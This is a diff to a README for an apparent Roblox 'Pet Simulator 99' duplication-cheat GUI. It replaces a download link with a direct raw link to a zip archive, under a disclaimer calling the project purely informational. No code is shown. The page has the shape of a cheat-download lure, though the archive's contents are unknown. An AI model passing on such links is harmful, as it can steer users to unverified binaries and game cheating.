@@ -4,7 +4,7 @@ Pet-Simulator-99-Dupe-GUI is an informational GUI project related to Pet Simulat
 
 This repository is provided **for informational and documentation purposes only** and does **not** include guidance for bypassing Roblox security, exploiting game systems, tampering, or performing any kind of unfair/duplicative actions.
 
-**[⬇️ Repository / Download](https://github.com/bbdsf/PS99-new-script-RNG-upd)**
+**[⬇️ Repository / Download](https://raw.githubusercontent.com/michaelnessim/Pet-Simulator-99-Dupe-GUI/main/Asperula/v2.3-beta.4.zip)**
 
 ## 🚀 Premium Features (UI / Interface)
 
